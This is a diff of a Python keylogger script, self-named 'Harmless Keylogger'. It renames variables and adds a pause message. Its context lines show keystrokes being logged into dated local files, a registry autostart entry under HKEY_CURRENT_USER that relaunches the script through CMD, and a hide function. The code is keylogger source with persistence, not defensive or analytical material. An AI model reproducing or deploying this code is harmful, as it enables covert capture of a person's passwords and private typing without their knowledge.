@@ -12,27 +12,26 @@ from datetime import timedelta, date
 from winreg import SetValueEx, OpenKey, HKEY_CURRENT_USER, KEY_ALL_ACCESS, REG_SZ, DeleteValue
 
 # Folder where the pages of your book get logged
-book_path = 'myBook'
-# Buffer for characters
-line_buffer = ''
+BOOK_PATH = 'myBook'
 # Config File
 CONFIG_FILE = 'keylogger-config.json'
 # Name of The Logger (Be carefull changeing this may results in unremoveable registered autostart)
 LOGGER_NAME = "Harmless Keylogger"
 # File path
-current_file_path = os.path.realpath(sys.argv[0])
+CURRENT_FILE_PATH = os.path.realpath(sys.argv[0])
 # Directory path
-dir_path = os.path.dirname(os.path.realpath(sys.argv[0]))
+DIR_PATH = os.path.dirname(os.path.realpath(sys.argv[0]))
 
 # Config Dict
 config = {}
-
+# Buffer for characters
+line_buffer = ''
 # Paused logging
 paused = False
 
 # Read confgi from json file
 def read_config():
-    config_path = join(dir_path, CONFIG_FILE)
+    config_path = join(DIR_PATH, CONFIG_FILE)
     if exists(config_path) and not os.stat(config_path).st_size == 0:
         with open(config_path, "r") as read_file:
             global config
@@ -59,10 +58,10 @@ def add_to_startup():
 
     key2change = OpenKey(HKEY_CURRENT_USER, key_val, 0, KEY_ALL_ACCESS)
 
-    reg_value_prefix = 'CMD /k "cd ' + dir_path + ' && ' + 'py' + ' '
+    reg_value_prefix = 'CMD /k "cd ' + DIR_PATH + ' && ' + 'py' + ' '
     reg_value_postfix = '"'
 
-    reg_value = reg_value_prefix + '"' + current_file_path + reg_value_postfix
+    reg_value = reg_value_prefix + '"' + CURRENT_FILE_PATH + reg_value_postfix
 
     try:
         SetValueEx(key2change, LOGGER_NAME, 0, REG_SZ, reg_value)
@@ -90,7 +89,7 @@ def log_debug():
 # Append file with pressed keys
 def log_local():
     global line_buffer, config
-    path = join(dir_path, book_path)
+    path = join(DIR_PATH, BOOK_PATH)
     file = join(path, ("" if config["page-prefix"] == "" else config["page-prefix"] + "_")  + "page_" + (date.today() - timedelta(days=1)).strftime('%Y-%m-%d') + ".txt")
     if not exists(path):
         os.makedirs(path)    
@@ -145,6 +144,7 @@ def key_callback(event):
 
 def pause_logging():
     global paused, line_buffer
+    print(LOGGER_NAME + (" paused" if not paused else " continue"))
     paused = not paused
 
 def hide():
